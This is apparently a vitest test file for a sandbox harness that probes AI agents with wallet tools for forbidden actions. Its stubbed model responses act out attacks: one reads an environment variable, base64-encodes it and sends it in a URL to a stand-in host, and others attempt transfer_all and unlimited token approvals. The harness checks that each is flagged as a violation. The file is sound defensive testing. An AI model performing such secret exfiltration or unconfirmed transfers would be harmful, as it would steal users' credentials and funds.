import Anthropic from '@anthropic-ai/sdk'
import { expect, test } from 'vitest'
import { createAnthropicClient } from '../src/llm'
import { runProbeSet } from '../src/runner'
import { createStore } from '../src/store'
import { createBudget } from '../src/budget'
import { executeRun } from '../src/runStep'
import { PROBES } from '../src/probes'
import type { ToolCall } from '../src/wallet/tools'
import { request, runDirectory } from './runFixtures'

test('an encoded host read in a URL path is caught even when the read name itself is benign', async () => {
  const probe = PROBES.secret_exfiltration
  const result = await executeRun(0, { probe, system: probe.systemPrompt('# Balance helper'), model: request.modelId,
    budget: createBudget({ dailyCalls: 3 }), maxSteps: 3, llm: { step: async ({ messages }) => {
      const read = messages.findLast((message) => message.role === 'tool')
      if (!read) return { toolCalls: [{ tool: 'read_env', args: { name: 'LANG' } }], text: '', done: false }
      const payload = Buffer.from(read.content).toString('base64')
      return { toolCalls: [{ tool: 'http_request', args: { url: `https://example.invalid/export/${payload}` } }], text: '', done: true }
    } } })
  expect(result.run.outcome).toBe('violation')
  expect(result.run.violations.map(({ rule }) => rule)).toEqual(['SECRET_EXFILTRATION'])
})

test.each([
  { tool: 'transfer_all', args: { amount: '10' } },
  { tool: 'approve', args: { token: 'USDT', amount: 'MAX_UINT256', spender: '0x3333333333333333333333333333333333333333' } },
  { tool: 'transfer', args: null },
])('a rejected $tool attempt is durable violation evidence rather than an error', async (call) => {
  const directory = runDirectory(), store = createStore(directory)
  let calls = 0
  const result = await runProbeSet(request, { store, budget: createBudget({ dailyCalls: 30 }), llm: { step: async () => {
    calls++
    if (calls > 1) expect(store.get(request.runId)?.probes[0]?.runs[0]?.outcome).toBe('violation')
    return { toolCalls: [call as unknown as ToolCall], text: '', done: true }
  } } })
  expect(result.result?.status).toBe('SANDBOX_FUZZ_FAILED')
  expect(result.probes[0]?.runs[0]?.violations.map(({ rule }) => rule)).toContain('TRANSFER_WITHOUT_CONFIRMATION')
  const restarted = createStore(directory); restarted.loadAll()
  expect(restarted.get(request.runId)?.result?.status).toBe('SANDBOX_FUZZ_FAILED')
})

test('billing errors stop after one paid attempt and retain infrastructure refund classification', async () => {
  let calls = 0
  const llm = createAnthropicClient({ apiKey: 'fixture-provider-credential', client: { messages: { create: async () => {
    calls++
    throw new Anthropic.BadRequestError(400, { type: 'error', error: {
      type: 'invalid_request_error', message: 'Your credit balance is too low to access the Anthropic API.',
    } }, undefined, new Headers())
  } } } })
  const result = await runProbeSet(request, { llm, store: createStore(runDirectory()), budget: createBudget({ dailyCalls: 30 }) })
  expect(result.result?.status).toBe('INCOMPLETE')
  expect(result.failure?.cause).toBe('infrastructure')
  expect(calls).toBe(1)
})

test('a rejected earlier call cannot hide a later forbidden attempt in the same model reply', async () => {
  const result = await runProbeSet(request, { store: createStore(runDirectory()), budget: createBudget({ dailyCalls: 30 }),
    llm: { step: async () => ({ text: '', done: true, toolCalls: [
      { tool: 'unknown_tool', args: {} }, { tool: 'transfer_all', args: { amount: '10' } },
    ] }) } })
  expect(result.result?.status).toBe('SANDBOX_FUZZ_FAILED')
  expect(result.probes[0]?.runs[0]?.violations.map(({ tool }) => tool)).toEqual(['transfer_all'])
})
